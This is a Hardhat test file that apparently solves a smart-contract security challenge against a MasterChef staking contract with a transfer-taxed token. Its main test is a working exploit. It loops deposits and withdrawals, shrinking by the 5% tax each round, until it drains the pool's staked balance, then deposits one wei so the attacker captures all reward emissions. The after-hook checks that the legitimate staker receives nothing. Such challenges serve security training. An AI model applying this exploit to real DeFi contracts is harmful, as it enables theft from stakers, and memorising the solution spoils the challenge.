import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let masterChef: Contract;
let mula: Contract; // staking token
let muny: Contract; // reward token
let startBlock: number;

/// preliminary state
before(async () => {
	accounts = await ethers.getSigners();
	[attacker, o1, o2, admin, adminUser] = accounts;

	// deploying contracts
	let mulaFactory = await ethers.getContractFactory("MulaToken");
	mula = await mulaFactory.connect(admin).deploy("MULA", "MULA");

	await mula
		.connect(admin)
		.mintPerUser(
			[await adminUser.getAddress(), await attacker.getAddress()],
			[precision.mul(10_000), precision.mul(10_000)]
		);

	let munyFactory = await ethers.getContractFactory("Token");
	muny = await munyFactory.connect(admin).deploy("MUNY", "MUNY");

	let masterChefFactory = await ethers.getContractFactory("MasterChef");
	masterChef = await masterChefFactory
		.connect(admin)
		.deploy(
			muny.address,
			await admin.getAddress(),
			precision.mul(1),
			(
				await ethers.provider.getBlock("latest")
			).number,
			(
				await ethers.provider.getBlock("latest")
			).number
		);

	await muny.connect(admin).transferOwnership(masterChef.address);

	// starting MULA staking
	await masterChef.connect(admin).add(1000, mula.address, false); // init staking

	await mula
		.connect(adminUser)
		.approve(masterChef.address, ethers.constants.MaxUint256);
	await masterChef.connect(adminUser).deposit(0, precision.mul(10_000));

	startBlock = (await ethers.provider.getBlock("latest")).number; // first reward block
});

it("solves the challenge", async function () {
	// Approve Master Chef
	await mula
		.connect(attacker)
		.approve(masterChef.address, ethers.constants.MaxUint256);

	// Attacker's initial balance
	let amount = precision.mul(10000);

	// Continue until Master Chef balance is less than the attacker's balance
	while (true) {
		// Deposit into Master Chef
		await masterChef.connect(attacker).deposit(0, amount);

		// Get Master Chef balance minus 1
		let balance = await mula.balanceOf(masterChef.address);
		balance = balance.sub(1);

		// Master Chef balance is less than the attacker's balance
		if (balance.lt(amount)) {
			// Withdraw the remaining Master Chef balance
			await masterChef.connect(attacker).withdraw(0, balance);
			break;
		} else {
			// Withdraw attacker's balance
			await masterChef.connect(attacker).withdraw(0, amount);
		}

		// Account for transfer tax
		amount = amount.mul(95).div(100);
	}

	// Deposit the final wei into the Master Chef
	await masterChef.connect(attacker).deposit(0, 1);
});

/// expected final state
after(async () => {
	// attacker drains all farm emissions up to this block
	let endBlock = (await ethers.provider.getBlock("latest")).number;
	expect(await muny.balanceOf(await attacker.getAddress())).to.be.gt(0);
	expect(await muny.balanceOf(await attacker.getAddress())).to.be.equal(
		precision.mul(1).mul(endBlock - startBlock) // all rewards issued from startBlock - endBlock
	);
	expect(await muny.balanceOf(masterChef.address)).to.be.equal(0);
	expect(await muny.balanceOf(await adminUser.getAddress())).to.be.equal(0);
});
